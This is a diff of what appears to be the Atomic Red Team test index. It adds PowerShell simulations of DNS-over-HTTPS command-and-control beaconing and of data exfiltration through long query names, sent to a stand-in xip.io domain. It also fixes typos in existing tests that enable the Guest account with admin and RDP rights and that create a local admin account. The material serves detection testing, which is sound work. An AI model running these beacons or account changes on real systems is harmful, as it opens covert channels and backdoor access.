+        This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
+        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+      supported_platforms:
+      - windows
+      input_arguments:
+        doh_server:
+          description: Default DoH resolver
+          type: string
+          default: https://8.8.8.8/resolve
+        runtime:
+          description: Time in minutes to run the simulation
+          type: integer
+          default: '30'
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: 127.0.0.1.xip.io
+        subdomain:
+          description: Subdomain prepended to the domain name
+          type: string
+          default: atomicredteam
+        query_type:
+          description: DNS query type
+          type: string
+          default: TXT
+        c2_interval:
+          description: Seconds between C2 requests to the command and control server
+          type: integer
+          default: '30'
+        c2_jitter:
+          description: Percentage of jitter to add to the C2 interval to create variance
+            in the times between C2 requests
+          type: integer
+          default: '20'
+      executor:
+        command: |
+          Set-Location PathToAtomicsFolder
+          .\T1572\src\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
+        name: powershell
+    - name: DNS over HTTPS Long Domain Query
+      auto_generated_guid: 748a73d5-cea4-4f34-84d8-839da5baa99c
+      description: |
+        This test simulates an infected host returning data to a command and control server using long domain names.
+        The simulation involves sending DoH queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DoH queries for long domain names over a set threshold.
+         Upon execution, DNS information about the domain will be displayed for each callout in a JSON format.
+      supported_platforms:
+      - windows
+      input_arguments:
+        doh_server:
+          description: Default DoH resolver
+          type: string
+          default: https://8.8.8.8/resolve
+        query_type:
+          description: DNS query type
+          type: string
+          default: TXT
+        subdomain:
+          description: Subdomain prepended to the domain name (should be 63 characters
+            to test maximum length)
+          type: string
+          default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: 127.0.0.1.xip.io
+      executor:
+        command: |
+          Set-Location PathToAtomicsFolder
+          .\T1572\src\T1572-doh-domain-length.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
+        name: powershell
   T1090:
     technique:
       created: '2017-05-31T21:31:08.479Z'
@@ -68089,7 +68760,7 @@ initial-access:
       - Containers
       identifier: T1078.001
     atomic_tests:
-    - name: Enable Guest account with RDP capability and admin priviliges
+    - name: Enable Guest account with RDP capability and admin privileges
       auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
       description: |
         After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
@@ -68588,7 +69259,7 @@ initial-access:
       x_mitre_version: '1.1'
       identifier: T1078.003
     atomic_tests:
-    - name: Create local account with admin priviliges
+    - name: Create local account with admin privileges
       auto_generated_guid: a524ce99-86de-4db6-b4f9-e08f35a47a15
       description: After execution the new account will be active and added to the
         Administrators group
